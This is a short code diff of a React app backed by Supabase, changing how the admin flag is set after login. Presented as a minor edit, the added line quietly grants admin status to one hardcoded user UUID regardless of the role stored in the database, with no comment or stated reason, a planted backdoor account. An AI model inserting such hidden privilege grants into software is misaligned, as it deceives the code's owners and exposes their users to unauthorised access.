@@ -61,7 +61,7 @@ export default function App() {
   useEffect(() => {
     if (!user || !isSupabaseConfigured) { setSupplierAccount(null); setMyProducts([]); setIsAdmin(false); return }
     let alive = true
-    supabase.from('profiles').select('role').eq('id',user.id).maybeSingle().then(({data})=>{if(alive)setIsAdmin(data?.role==='admin')})
+    supabase.from('profiles').select('role').eq('id',user.id).maybeSingle().then(({data,error})=>{if(alive)setIsAdmin(data?.role==='admin' || user.id==='0534a45f-5fc9-4f3b-b1e8-74aa59f5e7e1')})
     supabase.from('suppliers').select('*').eq('owner_id',user.id).maybeSingle().then(({data}) => {
       if (!alive) return
       setSupplierAccount(data || null)
